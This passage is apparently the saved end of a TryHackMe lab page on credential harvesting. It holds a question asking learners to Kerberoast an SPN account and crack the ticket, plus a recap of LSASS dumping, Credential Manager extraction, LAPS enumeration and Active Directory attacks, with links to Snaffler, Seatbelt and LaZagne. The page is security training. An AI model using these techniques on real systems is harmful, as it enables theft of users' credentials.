                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <p data-pf_style_display="block" data-pf_style_visibility="visible">After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?</p>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="2" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="9" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-10" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse10" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title red" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 10                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="far fa-circle text-lgray" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Conclusion
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse10" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-incomplete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Recap</span></p><p data-pf_style_display="block" data-pf_style_visibility="visible">In this room, we discussed the various approaches to obtaining users' credentials, including the local computer and Domain Controller, which conclude the following:</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible">We discussed accessing Windows memory, dumping an LSASS process, and extracting authentication hashes.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">We discussed Windows Credentials Manager and methods to extract passwords.&nbsp;</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">We introduced the Windows LAPS feature and enumerated it to find the correct user and target to extract passwords.</li><li data-pf_style_display="list-item" data-pf_style_visibility="visible">We introduced AD attacks which led to dumping and extracting users' credentials.</li></ul><p data-pf_style_display="block" data-pf_style_visibility="visible">The following tools may be worth trying to scan a target machine (files, memory, etc.) for hunting sensitive information. We suggest trying them out in the enumeration stage.</p><ul data-pf_style_display="block" data-pf_style_visibility="visible"><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://github.com/SnaffCon/Snaffler" data-pf_style_display="inline" data-pf_style_visibility="visible">Snaffler</a></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://github.com/GhostPack/Seatbelt" data-pf_style_display="inline" data-pf_style_visibility="visible">Seatbelt</a></li><li data-pf_style_display="list-item" data-pf_style_visibility="visible"><a href="https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/" data-pf_style_display="inline" data-pf_style_visibility="visible">Lazagne</a></li></ul></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <div data-pf_style_display="block" data-pf_style_visibility="visible">Good work on finishing the room and keep learning!<br data-pf_style_display="inline" data-pf_style_visibility="visible"></div>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="10" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Completed
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="card cd-2 text-center mt-3" data-pf_style_display="flex" data-pf_style_visibility="visible"><div class="card-body" data-pf_style_display="block" data-pf_style_visibility="visible"><p class="size-18" data-pf_style_display="block" data-pf_style_visibility="visible">Created by <img class="avatar-tiny" src="./TryHackMe _ Credentials Harvesting_files/af7feb2c43a2c7d5f111b98ccbd15048.png" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="16" data-pf_rect_height="16"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme" data-pf_style_display="inline" data-pf_style_visibility="visible">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Credentials Harvesting_files/26286532ed37cf8b7b375905f4306110.png" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="16" data-pf_rect_height="16"> 
        <a class="green-link" href="https://tryhackme.com/p/arebel" data-pf_style_display="inline" data-pf_style_visibility="visible">arebel</a></p><p class="mb-0" data-pf_style_display="block" data-pf_style_visibility="visible">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile" data-pf_style_display="inline" data-pf_style_visibility="visible">profile</a> page to subscribe (if you have not already). 7728 users are in here and this room is 318 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<div id="room-attackbox" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="attackbox-machine-instance" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div id="room-attackbox-loading" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
<div id="room-attackbox-vm-view" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</div>
<div id="attackbox-machine-options" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="d-flex hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></a>
<div onclick="extendHourWebBasedVM(null)" class="hover-pointer hidden-originally" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-plus hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div onclick="terminateWebBasedVM(null)" class="hover-pointer hidden-originally" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="far fa-power-off hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div onclick="exitViewAttackBox()" class="hover-pointer hidden-originally" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-minus hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div onclick="infoAttackBox()" class="hover-pointer faded hidden-originally" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-info hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></div>
<div class="d-flex hidden-originally" id="room-attackbox-tabs" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
</div>
</div>
<div class="modal fade hidden-originally" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-light-gray hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title m-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Web-Based Machine Information</h5>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Use the web-based machine to attack other target machines you start on TryHackMe.</p>
<ul class="normalList text-gray mt-3 mb-4 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Public IP: <code id="browser-machine-pubip" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Private IP: <code id="browser-machine-privip" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code> <span class="size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(Use this for your reverse shells)</span></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Username: <code id="browser-username" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Password: <code id="browser-password" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
<li class="mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Protocol: <code id="browser-protocol" class="dark size-14 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></code></li>
</ul>
<hr class="hr-min hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<ul class="text-lgray mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">To copy to and from the browser-based machine, highlight the text and press <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">CTRL+SHIFT+C</b> <details data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><summary data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">or use the clipboard</summary><img src="./TryHackMe _ Credentials Harvesting_files/clipboard.gif" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></details></li>
<li class="mt-2 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">should not be</b> the IP of your AttackBox)</li>
</ul>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="close size-30 text-lgray hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
<div id="award-modal-badges" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div>
<p class="mb-0 text-lgray size-18 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Complete the room to earn this badge</p>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fal fa-lightbulb-on hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Question Hint</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="modal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">...</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Credentials Harvesting_files/modal.css" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
<div class="modal-design-green modal fade hidden-originally" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" id="roomCompletedModalContent" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="close hidden-originally" id="closeRoomComplete" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fad fa-times-circle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</button>
<div class="icon-box hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<i class="fad fa-badge-check hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i>
</div>
<h3 class="text-accent mt-5 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Congratulations</h3>
<p class="faded mt-1 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></h2>
<div id="ticket-info" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"></div> 
<p class="faded mt-1 hidden-originally" id="roomFeedbackBtn" data-pf_style_display="none" data-pf_style_visibility="hidden">
<small data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<button class="bg-white border-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<input type="hidden" name="_csrf" value="ruUA6Iwd-x8PYlQ1mD_jj3igvOjngMkE2INA" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<input type="hidden" name="roomCode" value="credharvesting" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<input type="hidden" name="type" value="rooms" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<input type="hidden" name="redirect" value="json" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label class="mb-0 hidden-originally" for="like" data-pf_style_display="none" data-pf_style_visibility="hidden">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden" value=""></textarea>
</div>
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label class="mb-0 hidden-originally" for="dislike" data-pf_style_display="none" data-pf_style_visibility="hidden">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden" value=""></textarea>
</div>
<div class="form-group hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<label class="mb-0 hidden-originally" for="details" data-pf_style_display="none" data-pf_style_visibility="hidden">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control hidden-originally" style="padding: 5px;" data-pf_style_display="none" data-pf_style_visibility="hidden" value=""></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Send Feedback</button>
</form>
<p class="mt-2 mb-0 hidden-originally" id="formMessage" data-pf_style_display="none" data-pf_style_visibility="hidden"></p>
</div>
</div>
</div>
<script data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Credentials Harvesting_files/roomFeedback.js" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally"></script>
<div class="modal fade hidden-originally" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title m-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">To access this machine, you need to either</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="row vertical-align-custom mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-5 pr-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p class="size-18 bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use a VPN</p>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><button type="button" class="btn btn-light hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
or
</div>
<div class="col-sm-5 pl-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p class="size-18 bold hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Use the AttackBox</p>
<p data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">Use a web-based attack machine <span class="size-12 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade hidden-originally" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-sm hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h1 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><i class="text-warning fad fa-exclamation-triangle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></h1>
<h3 class="text-warning hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Expiring Soon</h3>
<p class="faded mt-3 mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-secondary hidden-originally" data-dismiss="modal" data-pf_style_display="none" data-pf_style_visibility="hidden">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade hidden-originally" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-sm hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h1 data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><i class="text-danger fad fa-exclamation-triangle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i></h1>
<h3 class="text-danger hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Expired Machine</h3>
<p class="faded mt-3 mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-secondary hidden-originally" data-dismiss="modal" data-pf_style_display="none" data-pf_style_visibility="hidden">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade hidden-originally" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-lg hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue text-center p-3 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h4 class="mb-0 m-auto hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">How to access machines</h4>
<button type="button" class="close modal-close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body text-center hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<p class="size-18 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="col-sm-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img src="./TryHackMe _ Credentials Harvesting_files/connect_openvpn_short.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<p class="mt-2 mb-0 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6 hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<img src="./TryHackMe _ Credentials Harvesting_files/connect_kali_short.png" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">
<p class="mt-2 mb-0 faded hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" id="roomAlertModalTitle" data-pf_style_display="none" data-pf_style_visibility="hidden"></h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body hidden-originally" id="roomAlertModalBody" data-pf_style_display="none" data-pf_style_visibility="hidden"></div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-secondary hidden-originally" data-dismiss="modal" data-pf_style_display="none" data-pf_style_visibility="hidden">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="resetUserProgressModal" role="dialog" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<h5 class="modal-title hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">Reset Your Progress</h5>
<button type="button" class="close hidden-originally" data-dismiss="modal" aria-label="Close" data-pf_style_display="none" data-pf_style_visibility="hidden">
<span aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally">×</span>
</button>
</div>
<div class="modal-body hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div data-pf_style_display="none" data-pf_style_visibility="hidden" class="hidden-originally"><span class="text-danger hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"><i class="fas fa-exclamation-triangle hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<button type="button" class="btn btn-danger hidden-originally" onclick="resetProgress()" data-pf_style_display="none" data-pf_style_visibility="hidden">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade hidden-originally" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true" data-pf_style_display="none" data-pf_style_visibility="visible">
<div class="modal-dialog modal-dialog-centered modal-lg hidden-originally" role="document" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-content hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
<div class="modal-header modal-dark-blue hidden-originally" data-pf_style_display="none" data-pf_style_visibility="hidden">
